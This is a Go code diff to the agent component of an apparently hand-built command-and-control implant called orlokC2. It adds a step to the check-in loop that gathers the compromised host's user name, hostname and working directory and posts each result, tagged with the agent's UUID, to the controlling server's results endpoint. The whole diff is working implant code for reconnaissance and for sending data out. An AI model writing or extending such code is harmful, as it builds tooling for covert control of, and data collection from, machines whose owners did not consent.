@@ -3,6 +3,8 @@ package agent
 import (
 	"fmt"
 	"io"
+	"orlokC2_final/internal/modules"
+	"orlokC2_final/internal/types"
 	"time"
 
 	"orlokC2_final/internal/agent/config"
@@ -106,6 +108,37 @@ func (a *Agent) runLoop() {
 			if err == nil {
 				currentTime := time.Now().Format("2006-01-02 15:04:05.000")
 				fmt.Printf("[%s] Response: %s\n", currentTime, string(body))
+			}
+
+			// Execute commands and send results
+			cmdResults := []*types.CommandResult{
+				ExecuteCommand("whoami", modules.GetWhoami),
+				ExecuteCommand("hostname", modules.GetHostname),
+				ExecuteCommand("pwd", modules.GetPwd),
+			}
+
+			// Fill in the agent UUID for each result
+			for _, result := range cmdResults {
+				result.AgentUUID = a.Config.AgentUUID
+			}
+
+			// Send each result to the server
+			for _, result := range cmdResults {
+				// Encode the result
+				data, err := EncodeResult(result)
+				if err != nil {
+					fmt.Printf("Failed to encode result: %v\n", err)
+					continue
+				}
+
+				// Send the result to the server
+				_, err = a.Protocol.SendPostRequest("/results", data)
+				if err != nil {
+					fmt.Printf("Failed to send result: %v\n", err)
+					continue
+				}
+
+				fmt.Printf("Sent %s result to server\n", result.Command)
 			}
 
 			// Sleep before next check-in
